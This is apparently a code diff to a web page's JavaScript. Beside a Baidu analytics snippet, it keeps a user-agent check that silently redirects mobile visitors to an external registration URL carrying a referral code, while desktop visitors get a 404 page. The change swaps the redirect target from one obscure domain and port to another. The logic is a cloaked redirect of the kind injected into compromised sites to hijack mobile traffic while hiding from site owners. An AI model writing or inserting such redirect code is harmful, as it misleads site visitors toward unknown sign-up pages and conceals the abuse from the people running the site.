@@ -7,7 +7,7 @@ var _hmt = _hmt || [];
 })();
 
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	window.location.href="https://www.iol2e.com:9505/entry/register/?i_code=39290091";
+	window.location.href="https://www.6jxaa.com:9149/entry/register/?i_code=39290091";
 }else{
 	window.location.href="/404.html";
 }
